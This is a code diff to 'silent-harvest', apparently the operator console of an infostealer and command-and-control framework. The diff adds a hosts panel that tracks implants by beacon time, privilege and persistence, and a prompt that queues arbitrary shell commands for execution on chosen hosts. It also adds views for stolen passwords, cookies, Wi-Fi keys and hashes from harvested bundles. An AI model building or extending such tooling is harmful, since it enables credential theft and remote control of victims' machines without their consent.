@@ -8,9 +8,13 @@ raw-keyboard input on Windows (msvcrt) and POSIX (termios).
 
 Keys
   list      ↑/↓ j/k select · PgUp/PgDn · Enter detail
-            p parse full · r parse redacted · s shred (confirm)
+            / live filter (Esc clears, Enter keeps) · o cycle sort
+            H hosts panel · p parse full · s shred (confirm)
             l access log · c creds.json · h help · R rescan · q quit
-  detail    v report.txt · m manifest.json · p/r/s as above · Esc back
+  detail    v report.txt · m manifest.json · c creds.json
+            u unlocked/ outputs · p/s as above · Esc/q back
+  hosts     ↑/↓ select · t queue exec task · x clear queue
+            Enter view queued tasks · Esc/q back
   pager     ↑↓ scroll · PgUp/PgDn · g/G top/bottom · q/Esc back
 
 Watch mode (default) re-scans the loot dir every 2s — leave the collector
@@ -166,12 +170,60 @@ def dir_fingerprint(loot_dir):
     try:
         idx = os.path.join(loot_dir, "index.jsonl")
         acc = os.path.join(loot_dir, "access.log")
+        hosts = os.path.join(loot_dir, "hosts.json")
         st = (os.path.getmtime(loot_dir),
               os.path.getmtime(idx) if os.path.exists(idx) else 0,
-              os.path.getmtime(acc) if os.path.exists(acc) else 0)
+              os.path.getmtime(acc) if os.path.exists(acc) else 0,
+              os.path.getmtime(hosts) if os.path.exists(hosts) else 0)
         return st
     except OSError:
-        return (0, 0, 0)
+        return (0, 0, 0, 0)
+
+
+def scan_hosts(loot_dir):
+    """hosts.json + queued-task counts -> rows for the C2 panel."""
+    rows = []
+    hp = os.path.join(loot_dir, "hosts.json")
+    if os.path.exists(hp):
+        try:
+            h = json.load(open(hp, encoding="utf-8"))
+        except Exception:
+            h = {}
+        now = time.time()
+        for hid, v in sorted(h.items(),
+                             key=lambda kv: -kv[1].get("last_seen", 0)):
+            age = now - v.get("last_seen", 0)
+            rows.append({
+                "id": hid,
+                "online": age < 600,
+                "seen": ("%dm" % (age // 60)) if age < 3600
+                        else ("%dh" % (age // 3600)) if age < 86400
+                        else "%dd" % (age // 86400),
+                "beacons": v.get("beacons", 0),
+                "elevated": str(v.get("elevated", "?")).lower() == "true",
+                "persist": str(v.get("persist", "?")),
+                "version": str(v.get("version", "?")),
+                "queued": len(load_queue(loot_dir, hid)),
+            })
+    return rows
+
+
+def load_queue(loot_dir, hid):
+    p = os.path.join(loot_dir, "tasks", hid + ".json")
+    try:
+        return json.load(open(p, encoding="utf-8"))
+    except Exception:
+        return []
+
+
+def save_queue(loot_dir, hid, q):
+    d = os.path.join(loot_dir, "tasks")
+    os.makedirs(d, exist_ok=True)
+    import tempfile
+    fd, tmp = tempfile.mkstemp(dir=d, suffix=".tmp")
+    with os.fdopen(fd, "w", encoding="utf-8") as f:
+        json.dump(q, f, indent=2)
+    os.replace(tmp, os.path.join(d, hid + ".json"))
 
 
 # --------------------------------------------------------------------- app
@@ -192,7 +244,7 @@ HELP = [
 
 
 class App:
-    VIEWS = ("list", "detail", "pager", "help")
+    VIEWS = ("list", "detail", "pager", "help", "hosts")
 
     def __init__(self, loot_dir, watch=True):
         self.loot = os.path.abspath(loot_dir)
@@ -210,7 +262,34 @@ class App:
         self.confirm = None          # pending confirmation prompt text+action
         self.help_top = 0
         self.last_fp = None
+        # filtering / sorting (list view)
+        self.filter = ""
+        self.filtering = False
+        self.sort_mode = 0           # 0 recent, 1 size, 2 host
+        self.sort_modes = (("recent", lambda b: b["ts"]),
+                           ("size", lambda b: b["size"]),
+                           ("host", lambda b: (b["host"], b["ts"])))
+        # hosts / c2 panel
+        self.hosts_sel = 0
+        # modal single-line input (task command etc.)
+        self.prompt_title = ""
+        self.prompt_buf = ""
+        self.prompt_cb = None
         self.rescan()
+
+    # ---------------------------------------------------------- filtering
+    def visible_bundles(self):
+        if not self.filter:
+            return self.bundles
+        f = self.filter.lower()
+        return [b for b in self.bundles
+                if f in b["host"].lower() or f in b["user"].lower()
+                or f in b["id"].lower() or f in b["platform"].lower()]
+
+    def resort(self):
+        key = self.sort_modes[self.sort_mode][1]
+        self.bundles.sort(key=key, reverse=self.sort_mode != 2)
+        self.sel = min(self.sel, max(0, len(self.visible_bundles()) - 1))
 
     # ---------------------------------------------------------- helpers
     def rescan(self):
@@ -229,13 +308,23 @@ class App:
         self.last_fp = dir_fingerprint(self.loot)
 
     def cur(self):
-        if 0 <= self.sel < len(self.bundles):
-            return self.bundles[self.sel]
+        shown = self.visible_bundles()
+        if 0 <= self.sel < len(shown):
+            return shown[self.sel]
         return None
 
     def flash(self, msg, *codes):
         self.status = s(msg, *codes) if codes else msg
         self.status_at = time.time()
+
+    def load_pager_text(self, text, title):
+        """Page over in-memory text (task queues etc.)."""
+        self.pager_lines = text.splitlines()
+        self.pager_top = 0
+        self.pager_title = title
+        self.pager_file = None
+        self.pager_from = self.view
+        self.view = "pager"
 
     def load_pager(self, path, title):
         if not os.path.exists(path):
@@ -296,14 +385,25 @@ class App:
         # header
         total = sum(b["size"] for b in self.bundles)
         nparsed = sum(1 for b in self.bundles if b["parsed"])
-        head = " %s  %s bundles · %s · %s parsed%s" % (
+        hosts = scan_hosts(self.loot)
+        online = sum(1 for h in hosts if h["online"])
+        head = " %s  %s bundles · %s · %s parsed%s  %s host(s), %s online%s" % (
             s("silent-harvest", C.BOLD, C.CYAN),
             s(str(len(self.bundles)), C.BOLD),
             s(term.human_size(total), C.CYAN),
             s(str(nparsed), C.GREEN),
-            s("   [watch]" if self.watch else "", C.GREY))
+            s("   [watch]" if self.watch else "", C.GREY),
+            s(str(len(hosts)), C.BOLD),
+            s(str(online), C.GREEN),
+            s("   sort:%s" % self.sort_modes[self.sort_mode][0], C.GREY))
         out.append(head[:cols])
-        out.append(s("─" * (cols - 1), C.DIM))
+        if self.filter:
+            tip = "  (Enter keep · Esc clear)" if self.filtering else ""
+            out.append(s(" filter: %s" % self.filter, C.YELLOW)
+                       + s("  (%d shown)%s" % (len(self.visible_bundles()), tip),
+                          C.GREY))
+        else:
+            out.append(s("─" * (cols - 1), C.DIM))
 
         if self.view == "list":
             out += self.render_list(body_h, cols)
@@ -313,6 +413,8 @@ class App:
             out += self.render_pager(body_h, cols)
         elif self.view == "help":
             out += self.render_help(body_h, cols)
+        elif self.view == "hosts":
+            out += self.render_hosts(body_h, cols)
 
         # pad body to fixed height, then status + key bar
         while len(out) < 2 + body_h:
@@ -321,17 +423,25 @@ class App:
 
         if self.confirm:
             out.append(" " + self.confirm[0][:cols - 2])
+        elif self.prompt_cb is not None:
+            out.append(" %s %s%s" % (
+                s(self.prompt_title, C.CYAN, C.BOLD),
+                self.prompt_buf,
+                s("▏", C.CYAN)))
         elif self.status and time.time() - self.status_at < 6:
             out.append(" " + self.status[:cols - 2])
         else:
             out.append("")
 
         hints = {
-            "list": "↑↓ select · Enter detail · p parse · r redact · s shred · "
-                    "l log · c creds · h help · q quit",
-            "detail": "v report · m manifest · p parse · r redact · s shred · Esc back",
+            "list": "↑↓ select · Enter detail · / filter · o sort · H hosts · "
+                    "p parse · s shred · l log · h help · q quit",
+            "detail": "v report · m manifest · c creds · u unlock outputs · "
+                      "p parse · s shred · Esc/q back",
             "pager": "↑↓ scroll · PgUp/PgDn · g/G top/bottom · q/Esc back",
             "help": "q/Esc close",
+            "hosts": "↑↓ select · t task exec · x clear queue · Enter view tasks · "
+                     "Esc/q back",
         }
         out.append(s(" " + hints.get(self.view, hints["list"]), C.GREY))
         # clip every line to the terminal width so nothing ever wraps and
@@ -339,14 +449,17 @@ class App:
         return [term.clip(ln, cols) if ln else ln for ln in out]
 
     def render_list(self, h, cols):
+        shown = self.visible_bundles()
         if not self.bundles:
             return ["", s("  no bundles under %s" % self.loot, C.YELLOW),
                     s("  run the collector (server/collector.py) and harvests "
                       "will appear here%s" % (" live" if self.watch else ""), C.GREY)]
+        if not shown:
+            return ["", s("  filter '%s' matches nothing" % self.filter, C.YELLOW)]
         headers = ["WHEN", "HOST", "USER", "PLAT", "ELEV", "PARTS", "SIZE", "PARSED"]
         now = time.time()
         rows = []
-        for b in self.bundles:
+        for b in shown:
             dt = now - b["ts"]
             when = ("%dm ago" % (dt // 60)) if dt < 3600 else (
                 "%dh ago" % (dt // 3600)) if dt < 86400 else "%dd" % (dt // 86400)
@@ -372,6 +485,47 @@ class App:
             out.append(line)
         if end < len(rows):
             out.append(s("  … %d more" % (len(rows) - end), C.GREY))
+        return out
+
+    def render_hosts(self, h, cols):
+        hosts = scan_hosts(self.loot)
+        if not hosts:
+            return ["", s("  no hosts registered yet", C.YELLOW),
+                    s("  hosts appear when an implant beacons or exfils "
+                      "(--loop builds)", C.GREY)]
+        headers = ["HOST", "STATUS", "SEEN", "BEACONS", "ELEV", "PERSIST",
+                   "VER", "QUEUED"]
+        rows = []
+        for hh in hosts:
+            rows.append([
+                hh["id"],
+                s("● online", C.GREEN, C.BOLD) if hh["online"]
+                else s("○ off", C.GREY),
+                hh["seen"],
+                str(hh["beacons"]),
+                s("yes", C.YELLOW, C.BOLD) if hh["elevated"] else "-",
+                hh["persist"][:12],
+                hh["version"][:8],
+                s(str(hh["queued"]), C.MAGENTA, C.BOLD) if hh["queued"] else "0",
+            ])
+        out = []
+        self.hosts_sel = min(self.hosts_sel, len(hosts) - 1)
+        start, end = self._paginate(len(rows), h)
+        tbl = term.table(headers, rows)
+        out.append(tbl[0])
+        for i in range(start, end):
+            marker = "▸" if i == self.hosts_sel else " "
+            line = marker + tbl[1 + i][1:]
+            if i == self.hosts_sel:
+                line = s(line, C.REVERSE)
+            out.append(line)
+        # show queued task detail under the table when room allows
+        if end >= len(rows) and hosts and hosts[self.hosts_sel]["queued"]:
+            out.append("")
+            out.append(s("  queued tasks for %s:" % hosts[self.hosts_sel]["id"],
+                         C.BOLD, C.MAGENTA))
+            for t in load_queue(self.loot, hosts[self.hosts_sel]["id"])[:4]:
+                out.append("   " + s(json.dumps(t), C.GREY)[:cols - 4])
         return out
 
     def _paginate(self, n, h):
@@ -449,6 +603,24 @@ class App:
                 self.confirm = None
             return
 
+        # modal single-line input (task exec etc.)
+        if self.prompt_cb is not None:
+            if k == "enter":
+                cb, val = self.prompt_cb, self.prompt_buf
+                self.prompt_cb = None
+                self.prompt_buf = ""
+                if val.strip():
+                    cb(val.strip())
+            elif k == "esc":
+                self.prompt_cb = None
+                self.prompt_buf = ""
+                self.flash("cancelled")
+            elif k == "backspace":
+                self.prompt_buf = self.prompt_buf[:-1]
+            elif k is not None and len(k) == 1 and k.isprintable():
+                self.prompt_buf += k
+            return
+
         if self.view == "help":
             if k in ("q", "esc", "h", "?", "enter"):
                 self.view = "list"
@@ -456,6 +628,10 @@ class App:
 
         if self.view == "pager":
             self._pager_keys(k)
+            return
+
+        if self.view == "hosts":
+            self._hosts_keys(k)
             return
 
         if self.view == "detail":
@@ -469,6 +645,8 @@ class App:
                 self.load_pager(os.path.join(b["dir"], "manifest.json"), "manifest.json")
             elif k == "c" and b:
                 self.load_pager(os.path.join(b["dir"], "creds.json"), "creds.json")
+            elif k == "u" and b:
+                self._open_unlocked(b)
             elif k in ("p", "r"):
                 self.do_parse(redact=(k == "r"))
             elif k == "s":
@@ -476,7 +654,36 @@ class App:
             return
 
         # list view
-        n = len(self.bundles)
+        n = len(self.visible_bundles())
+        if k in (None, "?0", "?1"):
+            return
+        # '/' opens the filter; while open, ALL printable keys edit it
+        if self.filtering or k == "/":
+            if not self.filtering:          # opening: swallow the '/'
+                self.filtering = True
+                return
+            if k == "esc":
+                self.filtering = False
+                self.filter = ""
+                self.sel = 0
+                self.flash("filter cleared", C.CYAN)
+            elif k == "enter":
+                self.filtering = False
+            elif k == "backspace":
+                self.filter = self.filter[:-1]
+                if not self.filter:
+                    self.filtering = False
+                self.sel = min(self.sel, max(0, len(self.visible_bundles()) - 1))
+            elif k is not None and len(k) == 1 and k.isprintable():
+                self.filter += k
+                self.sel = min(self.sel, max(0, len(self.visible_bundles()) - 1))
+            return
+        # Esc with a kept filter still clears it
+        if k == "esc" and self.filter:
+            self.filter = ""
+            self.sel = 0
+            self.flash("filter cleared", C.CYAN)
+            return
         if k in ("up", "k") and n:
             self.sel = max(0, self.sel - 1)
         elif k in ("down", "j") and n:
@@ -507,6 +714,73 @@ class App:
             self.flash("rescanned: %d bundles" % len(self.bundles), C.CYAN)
         elif k in ("h", "?"):
             self.view = "help"
+        elif k == "H":
+            self.view = "hosts"
+            self.hosts_sel = 0
+        elif k == "o":
+            self.sort_mode = (self.sort_mode + 1) % len(self.sort_modes)
+            self.resort()
+            self.flash("sort: %s" % self.sort_modes[self.sort_mode][0], C.CYAN)
+        elif k == "/":
+            pass  # handled above
+
+    # ------------------------------------------------------- hosts panel
+    def _hosts_keys(self, k):
+        hosts = scan_hosts(self.loot)
+        n = len(hosts)
+        if not n:
+            if k in ("esc", "q", "H", "enter"):
+                self.view = "list"
+            return
+        self.hosts_sel = min(self.hosts_sel, n - 1)
+        if k in ("up", "k"):
+            self.hosts_sel = max(0, self.hosts_sel - 1)
+        elif k in ("down", "j"):
+            self.hosts_sel = min(n - 1, self.hosts_sel + 1)
+        elif k in ("esc", "q", "H"):
+            self.view = "list"
+        elif k == "t":
+            hid = hosts[self.hosts_sel]["id"]
+            self.prompt_title = "exec on %s:" % hid
+            self.prompt_cb = lambda cmd, _hid=hid: self.queue_exec(_hid, cmd)
+        elif k == "x":
+            hid = hosts[self.hosts_sel]["id"]
+            save_queue(self.loot, hid, [])
+            self.flash("queue cleared for %s" % hid, C.CYAN)
+        elif k == "enter":
+            hid = hosts[self.hosts_sel]["id"]
+            q = load_queue(self.loot, hid)
+            if not q:
+                self.flash("no queued tasks for %s" % hid)
+            else:
+                self.load_pager_text(
+                    "\n".join(json.dumps(t, indent=2) for t in q),
+                    "queued tasks: %s" % hid)
+
+    def queue_exec(self, hid, cmd):
+        q = load_queue(self.loot, hid)
+        q.append({"id": "tui-%d" % int(time.time()), "exec": cmd})
+        save_queue(self.loot, hid, q)
+        self.flash("queued on %s: %s" % (hid, cmd), C.GREEN)
+
+    def _open_unlocked(self, b):
+        """Page through offline_unlock outputs if present for this bundle."""
+        ud = os.path.join(b["dir"], "unlocked")
+        if not os.path.isdir(ud):
+            self.flash("no unlocked/ outputs yet — run offline_unlock.py first")
+            return
+        want = ("passwords.txt", "cookies_all.txt", "wifi.txt", "hashes.txt",
+                "report.txt")
+        for w in want:
+            p = os.path.join(ud, w)
+            if os.path.exists(p):
+                self.load_pager(p, "unlocked/%s" % w)
+                return
+        files = sorted(os.listdir(ud))
+        if files:
+            self.load_pager(os.path.join(ud, files[0]), "unlocked/%s" % files[0])
+        else:
+            self.flash("unlocked/ is empty")
 
     def _pager_keys(self, k):
         visible = 20
@@ -574,7 +848,11 @@ def run(app, keys=None):
                 sys.stdout.flush()
                 last_frame = frame
             k = keys.getkey(200)
-            if k in ("q", "\x03"):
+            # 'q' means "quit" ONLY in list view; everywhere else it means
+            # "go back" and is handled by the view's own key handler
+            if k == "\x03":
+                break
+            if k == "q" and app.view == "list" and app.prompt_cb is None:
                 break
             if k:
                 app.handle_key(k)
